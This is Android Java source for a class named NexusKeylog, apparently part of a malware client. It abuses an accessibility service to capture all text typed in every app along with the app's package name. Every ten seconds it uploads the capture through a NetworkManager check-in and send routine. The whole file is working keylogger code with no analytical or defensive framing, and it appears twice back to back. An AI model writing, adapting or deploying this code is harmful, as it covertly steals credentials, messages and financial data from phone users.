package com.nexus.client;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.Handler;
import android.os.Looper;

public class NexusKeylog extends AccessibilityService {
    private String currentApp = "";
    private StringBuilder buffer = new StringBuilder();
    private final Handler handler = new Handler(Looper.getMainLooper());

    private final Runnable flusher = new Runnable() {
        @Override
        public void run() {
            if (buffer.length() > 0) {
                NetworkManager.sendKeylog(currentApp, buffer.toString());
                buffer.setLength(0);
            }
            handler.postDelayed(this, 10000);
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        handler.post(flusher);
        NetworkManager.checkIn();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                currentApp = event.getPackageName().toString();
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                buffer.append(event.getText().toString()).append(" ");
            }
        }
    }

    @Override
    public void onInterrupt() {}
}package com.nexus.client;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.os.Handler;
import android.os.Looper;

public class NexusKeylog extends AccessibilityService {
    private String currentApp = "";
    private StringBuilder buffer = new StringBuilder();
    private final Handler handler = new Handler(Looper.getMainLooper());

    private final Runnable flusher = new Runnable() {
        @Override
        public void run() {
            if (buffer.length() > 0) {
                NetworkManager.sendKeylog(currentApp, buffer.toString());
                buffer.setLength(0);
            }
            handler.postDelayed(this, 10000);
        }
    };

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        handler.post(flusher);
        NetworkManager.checkIn();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null) {
                currentApp = event.getPackageName().toString();
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                buffer.append(event.getText().toString()).append(" ");
            }
        }
    }

    @Override
    public void onInterrupt() {}
}